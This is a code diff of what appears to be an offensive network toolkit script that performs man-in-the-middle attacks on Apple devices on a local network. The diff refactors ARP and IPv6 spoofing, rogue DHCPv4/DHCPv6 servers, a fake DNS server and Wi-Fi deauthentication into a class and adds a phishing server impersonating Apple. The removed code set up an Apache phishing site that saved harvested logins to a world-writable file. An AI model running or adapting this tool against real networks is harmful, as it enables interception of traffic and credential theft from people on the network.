@@ -22,6 +22,7 @@ from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
 from raw_packet.Servers.dns_server import DnsServer
 from raw_packet.Servers.dhcpv4_server import DHCPv4Server
 from raw_packet.Servers.dhcpv6_server import DHCPv6Server
+from raw_packet.Servers.Phishing.phishing import PhishingServer
 
 from raw_packet.Scripts.NCC.ncc import NetworkConflictCreator
 from raw_packet.Scripts.Apple.apple_dhcp_server import AppleDHCPServer
@@ -29,15 +30,11 @@ from raw_packet.Scripts.ARP.arp_spoof import ArpSpoof
 from raw_packet.Scripts.IPv6.ipv6_spoof import IPv6Spoof
 
 from prettytable import PrettyTable
-from os import path, makedirs, stat
-from shutil import copyfile, copytree
 from argparse import ArgumentParser, RawTextHelpFormatter
-from sys import exit, stdout
 from time import sleep
 from ipaddress import IPv4Address
 from random import randint
 from typing import Union, List, Dict
-import re
 # endregion
 
 # region Authorship information
@@ -52,293 +49,264 @@ __status__ = 'Development'
 # endregion
 
 
-# region Disconnect device
-def disconnect_device(network_interface: str = 'eth0',
-                      ip_address: str = '192.168.0.1',
-                      mac_address: str = '12:34:56:78:90:ab',
-                      use_deauth_technique: bool = False,
-                      deauth_interface: Union[None, str] = None,
-                      deauth_packets: int = 5,
-                      network_channel: Union[None, str] = None,
-                      network_bssid: Union[None, str] = None):
+class AppleMitm:
 
-    if not use_deauth_technique:
-        # Start Network Conflict Creator (ncc)
-        ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=network_interface)
-        ncc.start(target_mac_address=mac_address,
-                  target_ip_address=ip_address,
-                  exit_on_success=True)
+    deauth_stop: bool = False
 
-    else:
-        # Start WiFi deauth packets sender
-        deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address, deauth_packets)
+    # region Disconnect device
+    def disconnect_device(self,
+                          network_interface: str = 'eth0',
+                          ip_address: str = '192.168.0.1',
+                          mac_address: str = '12:34:56:78:90:ab',
+                          use_deauth_technique: bool = False,
+                          deauth_interface: Union[None, str] = None,
+                          deauth_packets: int = 5,
+                          network_channel: Union[None, str] = None,
+                          network_bssid: Union[None, str] = None):
 
-# endregion
+        if not use_deauth_technique:
+            # Start Network Conflict Creator (ncc)
+            ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=network_interface)
+            ncc.start(target_mac_address=mac_address,
+                      target_ip_address=ip_address,
+                      exit_on_success=True)
 
+        else:
+            # Start WiFi deauth packets sender
+            self.deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address, deauth_packets)
+    # endregion
 
-# region ARP spoofing
-def make_arp_spoof(network_interface: str = 'eth0',
-                   mac_address: str = '12:34:56:78:90:ab',
-                   ip_address: str = '129.168.0.1',
-                   gateway_ip_address: str = '129.168.0.254'):
-
-    # Start ARP Spoofing (arp_spoof)
-    arp_spoof: ArpSpoof = ArpSpoof(network_interface=network_interface)
-    arp_spoof.start(gateway_ipv4_address=gateway_ip_address,
-                    target_ipv4_address=ip_address,
-                    target_mac_address=mac_address,
-                    quit=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region NA spoofing
-def make_na_spoof(network_interface: str = 'eth0',
-                  mac_address: str = '12:34:56:78:90:ab',
-                  ipv6_address: str = 'fe80::123',
-                  gateway_ipv6_address: str = 'fe80::1',
-                  dns_ipv6_address: Union[None, str] = None):
-
-    # Start Neighbor Advertise spoofing script
-    ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
-    ipv6_spoof.start(technique=2,
-                     target_ipv6_address=ipv6_address,
-                     target_mac_address=mac_address,
-                     gateway_ipv6_address=gateway_ipv6_address,
-                     dns_ipv6_address=dns_ipv6_address,
-                     quit=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region RA spoofing
-def make_ra_spoof(network_interface: str = 'eth0',
-                  mac_address: str = '12:34:56:78:90:ab',
-                  ipv6_address: str = 'fe80::123',
-                  gateway_ipv6_address: str = 'fe80::1'):
-
-    # Start Router Advertise spoofing script
-    ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
-    ipv6_spoof.start(technique=1,
-                     target_ipv6_address=ipv6_address,
-                     target_mac_address=mac_address,
-                     gateway_ipv6_address=gateway_ipv6_address,
-                     quit=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region Rogue DHCP server
-def rogue_dhcp_server(network_interface: str = 'eth0',
-                      mac_address: str = '12:34:56:78:90:ab',
-                      ip_address: str = '129.168.0.1'):
-
-    # Start DHCP rogue server
-    dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=network_interface)
-    dhcpv4_server.start(target_mac_address=mac_address,
+    # region ARP spoofing
+    @staticmethod
+    def make_arp_spoof(network_interface: str = 'eth0',
+                       mac_address: str = '12:34:56:78:90:ab',
+                       ip_address: str = '129.168.0.1',
+                       gateway_ip_address: str = '129.168.0.254'):
+        # Wait 3 seconds
+        sleep(3)
+        # Start ARP Spoofing (arp_spoof)
+        arp_spoof: ArpSpoof = ArpSpoof(network_interface=network_interface)
+        arp_spoof.start(gateway_ipv4_address=gateway_ip_address,
                         target_ipv4_address=ip_address,
-                        apple=True, quit=True,
-                        exit_on_success=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region Rogue DHCP server with predict next transaction ID
-def rogue_dhcp_server_predict_trid(network_interface: str = 'eth0',
-                                   mac_address: str = '12:34:56:78:90:ab',
-                                   new_ip_address: str = '129.168.0.111'):
-
-    # Start DHCP rogue server with predict next transaction ID
-    apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=network_interface)
-    apple_dhcp_server.start(target_ip_address=new_ip_address,
-                            target_mac_address=mac_address,
-                            quit=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region Rogue DHCPv6 server
-def rogue_dhcpv6_server(network_interface: str = 'eth0',
-                        prefix: str = 'fd00::/64',
-                        mac_address: str = '12:34:56:78:90:ab',
-                        global_ipv6_address: str = 'fe80::123'):
-
-    # Start DHCPv6 rogue server
-    dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=network_interface)
-    dhcpv6_server.start(target_mac_address=mac_address,
-                        target_ipv6_address=global_ipv6_address,
-                        ipv6_prefix=prefix,
-                        exit_on_success=True,
+                        target_mac_address=mac_address,
                         quit=True)
-
-    # Wait 3 seconds
-    sleep(3)
-
-# endregion
-
-
-# region Start DNS server
-def start_dns_server(network_interface: str = 'eth0',
-                     mac_address: str = '12:34:56:78:90:ab',
-                     technique_index: int = 1,
-                     fake_ip_address: str = '129.168.0.2',
-                     mitm_success_domain: str = 'test.com'):
-    if technique_index in [1, 2, 3]:
-        dns_server.start(target_mac_address=mac_address,
-                         fake_answers=True,
-                         fake_ipv4_addresses=[fake_ip_address],
-                         success_domains=['captive.apple.com', mitm_success_domain])
-    if technique_index in [4, 5, 6]:
-        dns_server.start(target_mac_address=mac_address,
-                         fake_answers=True,
-                         fake_ipv4_addresses=[fake_ip_address],
-                         listen_ipv6=True,
-                         success_domains=['captive.apple.com', mitm_success_domain])
-# endregion
-
-
-# region Requests sniffer PRN function
-def requests_sniffer_prn(request: Dict):
-    global aireply_stop
-
-    # region Stop aireplay-ng
-    if 'DHCPv4' in request.keys() or 'ICMPv6' in request.keys():
-        aireply_stop = True
-        base.kill_process_by_name('aireplay-ng')
     # endregion
 
-# endregion
+    # region NA spoofing
+    @staticmethod
+    def make_na_spoof(network_interface: str = 'eth0',
+                      mac_address: str = '12:34:56:78:90:ab',
+                      ipv6_address: str = 'fe80::123',
+                      gateway_ipv6_address: str = 'fe80::1',
+                      dns_ipv6_address: Union[None, str] = None):
+        # Wait 3 seconds
+        sleep(3)
+        # Start Neighbor Advertise spoofing script
+        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
+        ipv6_spoof.start(technique=2,
+                         target_ipv6_address=ipv6_address,
+                         target_mac_address=mac_address,
+                         gateway_ipv6_address=gateway_ipv6_address,
+                         dns_ipv6_address=dns_ipv6_address,
+                         quit=True)
+    # endregion
 
+    # region RA spoofing
+    @staticmethod
+    def make_ra_spoof(network_interface: str = 'eth0',
+                      mac_address: str = '12:34:56:78:90:ab',
+                      ipv6_address: str = 'fe80::123',
+                      gateway_ipv6_address: str = 'fe80::1'):
+        # Wait 3 seconds
+        sleep(3)
+        # Start Router Advertise spoofing script
+        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
+        ipv6_spoof.start(technique=1,
+                         target_ipv6_address=ipv6_address,
+                         target_mac_address=mac_address,
+                         gateway_ipv6_address=gateway_ipv6_address,
+                         quit=True)
+    # endregion
 
-# region Requests sniffer function
-def requests_sniffer(source_mac_address: str = '12:34:56:78:90:ab'):
+    # region Rogue DHCP server
+    @staticmethod
+    def rogue_dhcpv4_server(network_interface: str = 'eth0',
+                            target_mac_address: str = '12:34:56:78:90:ab',
+                            target_ipv4_address: str = '129.168.0.1'):
+        # Wait 3 seconds
+        sleep(3)
+        # Start DHCP rogue server
+        dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=network_interface)
+        dhcpv4_server.start(target_mac_address=target_mac_address,
+                            target_ipv4_address=target_ipv4_address,
+                            apple=True, quit=True,
+                            exit_on_success=True)
+    # endregion
 
-    # region Set network filter
-    network_filters = {'Ethernet': {'source': source_mac_address}}
+    # region Rogue DHCP server for Apple devices
+    @staticmethod
+    def rogue_apple_dhcpv4_server(network_interface: str = 'eth0',
+                                  target_mac_address: str = '12:34:56:78:90:ab',
+                                  new_ip_address: str = '129.168.0.111'):
+        # Wait 3 seconds
+        sleep(3)
+        # Start DHCP rogue server with predict next transaction ID
+        apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=network_interface)
+        apple_dhcp_server.start(target_ip_address=new_ip_address,
+                                target_mac_address=target_mac_address,
+                                quit=True)
+    # endregion
 
-    if technique_index == 2:
-        network_filters = {
-            'Ethernet': {
-                'source': source_mac_address,
-                'destination': 'ff:ff:ff:ff:ff:ff'
-            },
-            'IPv4': {
-                'source-ip': '0.0.0.0',
-                'destination-ip': '255.255.255.255'
-            },
-            'UDP': {
-                'source-port': 68,
-                'destination-port': 67
+    # region Rogue DHCPv6 server
+    @staticmethod
+    def rogue_dhcpv6_server(network_interface: str = 'eth0',
+                            ipv6_prefix: str = 'fd00::/64',
+                            target_mac_address: str = '12:34:56:78:90:ab',
+                            global_ipv6_address: str = 'fd00::123'):
+        # Wait 3 seconds
+        sleep(3)
+        # Start DHCPv6 rogue server
+        dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=network_interface)
+        dhcpv6_server.start(target_mac_address=target_mac_address,
+                            target_ipv6_address=global_ipv6_address,
+                            ipv6_prefix=ipv6_prefix,
+                            exit_on_success=True,
+                            quit=True)
+    # endregion
+
+    # region Start DNS server
+    def start_dns_server(self,
+                         network_interface: str = 'eth0',
+                         target_mac_address: str = '12:34:56:78:90:ab',
+                         technique_index: int = 1,
+                         fake_ipv4_address: str = '129.168.0.2',
+                         mitm_success_domain: str = 'test.com'):
+        dns_server: DnsServer = DnsServer(network_interface=network_interface)
+        if technique_index in [1, 2, 3]:
+            dns_server.start(target_mac_address=target_mac_address,
+                             fake_answers=True,
+                             fake_ipv4_addresses=[fake_ipv4_address],
+                             success_domains=['captive.apple.com', mitm_success_domain])
+        if technique_index in [4, 5, 6]:
+            dns_server.start(target_mac_address=target_mac_address,
+                             fake_answers=True,
+                             fake_ipv4_addresses=[fake_ipv4_address],
+                             listen_ipv6=True,
+                             success_domains=['captive.apple.com', mitm_success_domain])
+    # endregion
+
+    # region Start Phishing server
+    @staticmethod
+    def start_phishing_server(address: str = '0.0.0.0',
+                              port: int = 80,
+                              site='apple'):
+        phishing_server: PhishingServer = PhishingServer()
+        phishing_server.start(address=address,
+                              port=port,
+                              site=site,
+                              quiet=False)
+    # endregion
+
+    # region Requests sniffer PRN function
+    def requests_sniffer_prn(self, request: Dict):
+        if 'DHCPv4' in request.keys() or 'ICMPv6' in request.keys():
+            self.deauth_stop = True
+    # endregion
+
+    # region Requests sniffer function
+    def requests_sniffer(self, source_mac_address: str = '12:34:56:78:90:ab'):
+
+        # region Set network filter
+        network_filters = {'Ethernet': {'source': source_mac_address}}
+
+        if technique_index == 2:
+            network_filters = {
+                'Ethernet': {
+                    'source': source_mac_address,
+                    'destination': 'ff:ff:ff:ff:ff:ff'
+                },
+                'IPv4': {
+                    'source-ip': '0.0.0.0',
+                    'destination-ip': '255.255.255.255'
+                },
+                'UDP': {
+                    'source-port': 68,
+                    'destination-port': 67
+                }
             }
-        }
+        # endregion
+
+        # region Start sniffer
+        sniff = RawSniff()
+        sniff.start(protocols=['ARP', 'IPv4', 'IPv6', 'ICMPv6', 'UDP', 'DHCPv4'],
+                    prn=self.requests_sniffer_prn, filters=network_filters)
+        # endregion
+
     # endregion
 
-    # region Start sniffer
-    sniff = RawSniff()
-    sniff.start(protocols=['ARP', 'IPv4', 'IPv6', 'ICMPv6', 'UDP', 'DHCPv4'],
-                prn=requests_sniffer_prn, filters=network_filters)
+    # region WiFi deauth packets sender
+    def deauth_packets_send(self,
+                            network_interface: str = 'wlan1',
+                            network_channel: str = '1',
+                            network_bssid: str = '12:34:56:78:90:ab',
+                            mac_address: str = '12:34:56:78:90:ac',
+                            number_of_deauth: int = 5):
+        pass
+        # global aireply_stop
+        #
+        # # Start target requests sniffer function
+        # threat_manager = ThreadManager(2)
+        # threat_manager.add_task(requests_sniffer, mac_address)
+        #
+        # # Set WiFi channel on interface for send WiFi deauth packets
+        # sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)
+        #
+        # # Start deauth packets numbers
+        # deauth_packets_number = number_of_deauth
+        # aireply_stop = False
+        #
+        # while deauth_packets_number < 50:
+        #
+        #     # Check global variable aireplay_stop
+        #     if aireply_stop:
+        #         base.print_info('Stop aireplay-ng ...')
+        #         break
+        #
+        #     # Start aireplay-ng process
+        #     try:
+        #         base.print_info('Send WiFi deauth packets in aireplay-ng ...')
+        #         aireplay_process = sub.Popen(['aireplay-ng ' + network_interface +
+        #                                       ' -0 ' + str(deauth_packets_number) +
+        #                                       ' -a ' + network_bssid +
+        #                                       ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
+        #         while True:
+        #             output = aireplay_process.stdout.readline().decode()
+        #             if output == '' and aireplay_process.poll() is not None:
+        #                 break
+        #             if output:
+        #                 stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', base.c_info + r'\g<1>', output))
+        #
+        #     except OSError:
+        #         base.print_error('Something else went wrong while trying to run ', '`aireply-ng`')
+        #         exit(2)
+        #
+        #     # Wait before sniff request packet from target
+        #     base.print_info('Wait 10 sec. before sniff packets from target: ' + mac_address)
+        #     sleep(10)
+        #
+        #     # Add 5 packets to number of WiFi deauth packets
+        #     deauth_packets_number += 5
     # endregion
-
-
-# endregion
-
-
-# region WiFi deauth packets sender
-def deauth_packets_send(network_interface: str = 'wlan1',
-                        network_channel: str = '1',
-                        network_bssid: str = '12:34:56:78:90:ab',
-                        mac_address: str = '12:34:56:78:90:ac',
-                        number_of_deauth: int = 5):
-    global aireply_stop
-
-    # Start target requests sniffer function
-    threat_manager = ThreadManager(2)
-    threat_manager.add_task(requests_sniffer, mac_address)
-
-    # Set WiFi channel on interface for send WiFi deauth packets
-    sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)
-
-    # Start deauth packets numbers
-    deauth_packets_number = number_of_deauth
-    aireply_stop = False
-
-    while deauth_packets_number < 50:
-
-        # Check global variable aireplay_stop
-        if aireply_stop:
-            base.print_info('Stop aireplay-ng ...')
-            break
-
-        # Start aireplay-ng process
-        try:
-            base.print_info('Send WiFi deauth packets in aireplay-ng ...')
-            aireplay_process = sub.Popen(['aireplay-ng ' + network_interface +
-                                          ' -0 ' + str(deauth_packets_number) +
-                                          ' -a ' + network_bssid +
-                                          ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
-            while True:
-                output = aireplay_process.stdout.readline().decode()
-                if output == '' and aireplay_process.poll() is not None:
-                    break
-                if output:
-                    stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', base.c_info + r'\g<1>', output))
-
-        except OSError:
-            base.print_error('Something else went wrong while trying to run ', '`aireply-ng`')
-            exit(2)
-
-        # Wait before sniff request packet from target
-        base.print_info('Wait 10 sec. before sniff packets from target: ' + mac_address)
-        sleep(10)
-
-        # Add 5 packets to number of WiFi deauth packets
-        deauth_packets_number += 5
-# endregion
-
-
-# region Kill processes
-def kill_processes(quit: bool = False) -> None:
-    if not quit:
-        base.print_info('Kill spoofing processes: ', 'arp_spoof.py, icmpv6_spoof.py')
-    base.kill_process_by_name('arp_spoof.py')
-    base.kill_process_by_name('icmpv6_spoof.py')
-
-    if not quit:
-        base.print_info('Kill rogue servers: ', 'dhcp_rogue_server.py, dhcpv6_rogue_server.py, apple_dhcp_server.py')
-    base.kill_process_by_name('dhcp_rogue_server.py')
-    base.kill_process_by_name('dhcpv6_rogue_server.py')
-    base.kill_process_by_name('apple_dhcp_server.py')
-
-    if not quit:
-        base.print_info('Kill ', 'aireplay-ng')
-    base.kill_process_by_name('aireplay-ng')
-# endregion
 
 
 # region Main function
-if __name__ == '__main__':
+def main():
 
     # region Init Raw-packet classes
     base: Base = Base()
     scanner: Scanner = Scanner()
     arp_scan: ArpScan = ArpScan()
     icmpv6_scan: ICMPv6Scan = ICMPv6Scan()
-    dns_server: DnsServer = DnsServer()
     thread_manager: ThreadManager = ThreadManager(5)
     # endregion
 
@@ -373,7 +341,8 @@ if __name__ == '__main__':
 
     try:
         # region Parse script arguments
-        parser = ArgumentParser(description='MiTM Apple devices in local network', formatter_class=RawTextHelpFormatter)
+        parser = ArgumentParser(description='MiTM Apple devices in local network',
+                                formatter_class=RawTextHelpFormatter)
         parser.add_argument('-T', '--technique', type=str, default=None,
                             help='Set MiTM technique:'
                                  '\n1. ARP Spoofing'
@@ -654,130 +623,6 @@ if __name__ == '__main__':
             base.print_info('Deauth network interface: ', deauth_network_interface)
         # endregion
 
-        # region Social engineering
-
-        # region Disable ipv4 forwarding
-        base.print_info('Disable ipv4 forwarding')
-        ipv4_forward_file_name = '/proc/sys/net/ipv4/ip_forward'
-        with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
-            ipv4_forward_file.write('0')
-        # endregion
-
-        # region Check OS installed software
-        base.print_info('Check OS installed software')
-        base.check_installed_software('apache2')
-        base.check_installed_software('service')
-        base.check_installed_software('ps')
-        # endregion
-
-        # region Variables
-        script_dir = project_root_path
-        apache2_sites_available_dir = '/etc/apache2/sites-available/'
-        apache2_sites_enabled_dir = '/etc/apache2/sites-enabled/'
-        apache2_sites_path = '/var/www/html/'
-        redirect_path = apache2_sites_path + 'redirect/'
-        # endregion
-
-        # region Set phishing domain and path
-        se_domain = args.phishing_domain
-        if args.phishing_domain_path == 'google' or 'apple' or 'microsoft':
-            se_path = apache2_sites_path + args.phishing_domain_path
-        else:
-            se_path = args.phishing_domain_path
-
-        base.print_info('Phishing domain: ', se_domain)
-        base.print_info('Phishing domain local path: ', se_path)
-        # endregion
-
-        # region Directory for phishing domain
-        if not path.exists(se_path):
-            if args.phishing_domain_path == 'google' or 'apple' or 'microsoft':
-                copytree(src=project_root_path + '/raw_packet/Utils/Phishing_domains/' + args.phishing_domain_path,
-                         dst=se_path)
-            else:
-                base.print_error('Directory: ', se_path, ' does not exist!')
-                exit(1)
-
-        credentials_file_name = se_path + '/logins.txt'
-        sub.Popen(['chmod 777 ' + credentials_file_name + ' >/dev/null 2>&1'], shell=True)
-        # endregion
-
-        # region Apache2 sites settings
-        default_site_file_name = '000-default.conf'
-        default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
-        default_site_file.write('<VirtualHost *:80>\n' +
-                                '\tServerAdmin admin@apple.com\n' +
-                                '\tRewriteEngine on\n' +
-                                '\tRewriteCond %{REQUEST_FILENAME} !-f\n' +
-                                '\tRewriteCond %{REQUEST_FILENAME} !-d\n' +
-                                '\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n' +
-                                '\tDocumentRoot ' + redirect_path + '\n' +
-                                '\t<Directory ' + redirect_path + '>\n' +
-                                '\t\tOptions FollowSymLinks\n' +
-                                '\t\tAllowOverride None\n' +
-                                '\t\tOrder allow,deny\n' +
-                                '\t\tAllow from all\n' +
-                                '\t</Directory>\n' +
-                                '</VirtualHost>\n\n' +
-                                '<VirtualHost *:80>\n' +
-                                '\tServerName ' + se_domain + '\n' +
-                                '\tServerAdmin admin@' + se_domain + '\n' +
-                                '\tDocumentRoot ' + se_path + '\n' +
-                                '\t<Directory ' + se_path + '>\n' +
-                                '\t\tOptions FollowSymLinks\n' +
-                                '\t\tAllowOverride None\n' +
-                                '\t\tOrder allow,deny\n' +
-                                '\t\tAllow from all\n' +
-                                '\t</Directory>\n' +
-                                '</VirtualHost>\n')
-        default_site_file.close()
-
-        # Create dir with redirect script
-        try:
-            makedirs(redirect_path)
-        except OSError:
-            base.print_info('Path: ', redirect_path, ' already exist')
-
-        # Copy and change redirect script
-        redirect_script_name = 'redirect.php'
-        redirect_script_src = script_dir + '/raw_packet/Utils/' + redirect_script_name
-        redirect_script_dst = redirect_path + redirect_script_name
-
-        copyfile(src=redirect_script_src, dst=redirect_script_dst)
-
-        # Read redirect script
-        with open(redirect_script_dst, 'r') as redirect_script:
-            content = redirect_script.read()
-
-        # Replace the string
-        content = content.replace('se_domain', se_domain)
-        content = content.replace('se_path', se_path)
-
-        # Write redirect script
-        with open(redirect_script_dst, 'w') as redirect_script:
-            redirect_script.write(content)
-
-        try:
-            base.print_info('Restarting apache2 server ...')
-            sub.Popen(['a2enmod rewrite  >/dev/null 2>&1'], shell=True)
-            sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
-        except OSError as e:
-            base.print_error('Something went wrong while trying to run ', '`service apache2 restart`')
-            exit(2)
-        # endregion
-
-        # region Check apache2 is running
-        sleep(2)
-        apache2_pid = base.get_process_pid('apache2')
-        if apache2_pid == -1:
-            base.print_error('Apache2 server is not running!')
-            exit(1)
-        else:
-            base.print_info('Apache2 server is running, PID: ', str(apache2_pid))
-        # endregion
-
-        # endregion
-
         # region Scan IPv4 local network
         if technique_index in [1, 2, 3]:
 
@@ -1007,4 +852,10 @@ if __name__ == '__main__':
 
     # endregion
 
+# endregion
+
+
+# region Call Main function
+if __name__ == '__main__':
+    main()
 # endregion
